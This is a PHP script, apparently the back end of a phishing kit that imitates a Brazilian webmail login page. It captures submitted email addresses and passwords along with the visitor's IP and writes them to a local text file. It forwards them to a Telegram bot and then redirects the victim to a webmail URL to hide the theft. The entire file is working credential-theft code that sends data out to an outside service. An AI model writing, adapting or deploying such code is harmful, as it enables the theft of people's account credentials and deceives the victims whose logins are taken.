<?php

// Incluir funções do telegram
include 'telegram_bot.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capturar dados do formulário
    $email = isset($_POST['_user']) ? $_POST['_user'] : (isset($_POST['userName']) ? $_POST['userName'] : '');
    $password = isset($_POST['_pass']) ? $_POST['_pass'] : (isset($_POST['pass']) ? $_POST['pass'] : '');

    // Capturar IP básico
    $ip = $_SERVER['REMOTE_ADDR'];

    // Formatar dados básicos
    $basicData = "\nEmail: " . $email . "\nSenha: " . $password . "\nIP: " . $ip . "\nData: " . date('Y-m-d H:i:s') . "\n";

    // Salvar dados básicos no arquivo
    file_put_contents('dados.txt', $basicData, FILE_APPEND);

    // Preparar e enviar mensagem para o Telegram
    if (!empty($email) && !empty($password)) {
        $msg = formatarDadosLogin($email, $password);
        $msg .= "\n🖥 <b>IP:</b> " . $ip;
        enviarParaTelegram($msg);
    }

    // Redireciona de volta para o locaweb oficial
    header('Location: https://webmail-seguro.com.br/?_task=mail&_mbox=INBOX');
    exit();
}
else {
    // Se não for um método POST, redireciona de volta ao formulário
    header("Location: index.php");
    exit();
}
?>